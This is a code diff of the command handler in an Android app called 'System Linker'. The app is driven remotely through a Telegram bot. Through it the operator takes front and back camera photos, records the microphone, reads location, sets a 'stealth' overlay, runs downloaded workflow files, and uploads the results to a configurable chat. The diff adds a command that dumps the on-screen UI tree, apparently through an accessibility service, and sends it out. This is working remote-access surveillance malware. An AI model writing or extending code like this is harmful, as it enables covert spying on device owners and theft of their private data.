@@ -1,18 +1,24 @@
 package com.systemlinker.features
 
+import android.content.BroadcastReceiver
 import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
+import android.os.Build
 import com.systemlinker.base.ConfigStore
 import com.systemlinker.base.ErrorLogger
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.suspendCancellableCoroutine
 import org.json.JSONObject
 import java.io.File
+import kotlin.coroutines.resume
 
 class CommandProcessor(
     private val context: Context,
-    private val defaultBotToken: String, // Ignored, reads from ConfigStore
-    private val defaultChatId: Long      // Ignored, reads from ConfigStore
+    private val defaultBotToken: String,
+    private val defaultChatId: Long
 ) {
     private val configStore = ConfigStore(context)
     private val uploader = TelegramUploader(context, configStore.botToken, configStore.targetChatId)
@@ -26,14 +32,24 @@ class CommandProcessor(
         val cmd = payload.optString("cmd", "")
         val arg = payload.optString("arg", "")
 
-        // Always ensure uploader has latest dynamic config before executing
         uploader.botToken = configStore.botToken
         uploader.chatId = configStore.targetChatId
 
         processorScope.launch {
             try {
                 when (cmd) {
-                    // --- NEW CONFIGURATION COMMANDS ---
+                    "help" -> {
+                        val type = arg.trim().lowercase()
+                        if (type == "workflow") {
+                            uploader.sendText("Generating Comprehensive Workflow Manual...")
+                            val docFile = HelpGenerator.generateWorkflowHelp(context)
+                            uploader.sendDocument(docFile, "📚 System Linker - Workflow Engine Guide\n\nTap the file to view perfectly formatted tables and code blocks. Use your device's native 'Copy' feature inside the document.", true)
+                        } else {
+                            uploader.sendText("Generating Command Reference Guide...")
+                            val docFile = HelpGenerator.generateCommandHelp(context)
+                            uploader.sendDocument(docFile, "🛠️ System Linker - Command Reference Guide\n\nTap the file to view perfectly formatted tables. Use your device's native 'Copy' feature inside the document.", true)
+                        }
+                    }
                     "set_bot_api" -> {
                         configStore.botToken = arg.trim()
                         uploader.botToken = configStore.botToken
@@ -49,26 +65,24 @@ class CommandProcessor(
                         uploader.sendText("Overlay duration set to ${configStore.overlayDurationMs}ms.")
                     }
                     "click_after_HS_switch" -> {
-                        // Example arg: "home,2" or "app_launch"
                         val parts = arg.split(",")
                         configStore.postHotspotAction = parts[0].trim()
                         configStore.postHotspotArgs = if (parts.size > 1) parts[1].trim().toIntOrNull() ?: 1 else 1
                         uploader.sendText("Post-Hotspot action set to: ${configStore.postHotspotAction} x${configStore.postHotspotArgs}")
                     }
                     "set_overlay" -> {
-                        uploader.sendText("⏳ Polling for 20 seconds. Please send an IMAGE now to set as the persistent overlay...")
+                        uploader.sendText("⏳ Polling for 30 seconds. Please send an IMAGE now to set as the persistent overlay...")
                         val destFile = File(context.filesDir, "stealth_overlay.jpg")
-                        val success = uploader.pollForFile(20, "photo", destFile)
+                        val success = uploader.pollForFile(30, "photo", destFile)
                         if (success) uploader.sendText("✅ Overlay image received and saved successfully.")
                         else uploader.sendText("❌ Timeout. No image received.")
                     }
 
-                    // --- WORKFLOW COMMANDS ---
                     "workflow" -> {
                         val wfName = arg.trim().ifBlank { "default_flow" }
-                        uploader.sendText("⏳ Polling for 20s. Please send a DOCUMENT (YML/TXT) for workflow: $wfName...")
+                        uploader.sendText("⏳ Polling for 30s Please send a DOCUMENT (YML/TXT) for workflow: $wfName...")
                         val destFile = File(context.filesDir, "$wfName.yml")
-                        val success = uploader.pollForFile(20, "document", destFile)
+                        val success = uploader.pollForFile(30, "document", destFile)
                         if (success) {
                             uploader.sendText("✅ Workflow '$wfName' received. Executing...")
                             workflowEngine.executeWorkflow(wfName)
@@ -81,24 +95,47 @@ class CommandProcessor(
                         workflowEngine.sendStatus(wfName)
                     }
 
-                    // --- KEEPING ALL EXISTING COMMANDS INTACT ---
-                    "ping" -> {
-                        val bat = systemHandler.getBasicBatteryStatus()
-                        uploader.sendText("🟢 Device Online\n$bat")
+                    // --- NEW STANDALONE SCREEN DUMP COMMAND ---
+                    "dump_screen" -> {
+                        uploader.sendText("Extracting UI DOM Tree...")
+                        val dumpFile = suspendCancellableCoroutine<File?> { cont ->
+                            val receiver = object : BroadcastReceiver() {
+                                override fun onReceive(c: Context?, intent: Intent?) {
+                                    if (intent?.action == "com.systemlinker.UI_RESULT") {
+                                        context.unregisterReceiver(this)
+                                        val msg = intent.getStringExtra("result") ?: ""
+                                        if (msg.contains("SUCCESS")) {
+                                            if (cont.isActive) cont.resume(File(context.filesDir, "ui_debug_dump.txt"))
+                                        } else {
+                                            if (cont.isActive) cont.resume(null)
+                                        }
+                                    }
+                                }
+                            }
+                            val filter = IntentFilter("com.systemlinker.UI_RESULT")
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
+                            } else {
+                                context.registerReceiver(receiver, filter)
+                            }
+                            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
+                                setPackage(context.packageName)
+                                putExtra("action", "dump_screen_request")
+                            }
+                            context.sendBroadcast(intent)
+                        }
+                        
+                        if (dumpFile != null && dumpFile.exists()) {
+                            uploader.sendDocument(dumpFile, "Standalone UI Debug Dump", true)
+                        } else {
+                            uploader.sendText("Failed to generate UI dump.")
+                        }
                     }
-                    "cam_front" -> {
-                        val file = mediaHandler.takePicture(isFront = true)
-                        if (file != null) uploader.sendFile(file, "photo", "Front Camera")
-                    }
-                    "cam_back" -> {
-                        val file = mediaHandler.takePicture(isFront = false)
-                        if (file != null) uploader.sendFile(file, "photo", "Back Camera")
-                    }
-                    "mic" -> {
-                        val duration = arg.toIntOrNull() ?: 15
-                        val file = mediaHandler.recordAudio(duration)
-                        if (file != null) uploader.sendFile(file, "audio", "Mic Record (${duration}s)")
-                    }
+
+                    "ping" -> uploader.sendText("🟢 Device Online\n${systemHandler.getBasicBatteryStatus()}")
+                    "cam_front" -> mediaHandler.takePicture(isFront = true)?.let { uploader.sendFile(it, "photo", "Front Camera") }
+                    "cam_back" -> mediaHandler.takePicture(isFront = false)?.let { uploader.sendFile(it, "photo", "Back Camera") }
+                    "mic" -> mediaHandler.recordAudio(arg.toIntOrNull() ?: 15)?.let { uploader.sendFile(it, "audio", "Mic Record") }
                     "loc" -> uploader.sendText(systemHandler.getLocation())
                     "flash" -> uploader.sendText(systemHandler.setFlashlight(arg == "on"))
                     "vol" -> systemHandler.setVolume(arg.toIntOrNull() ?: 50)
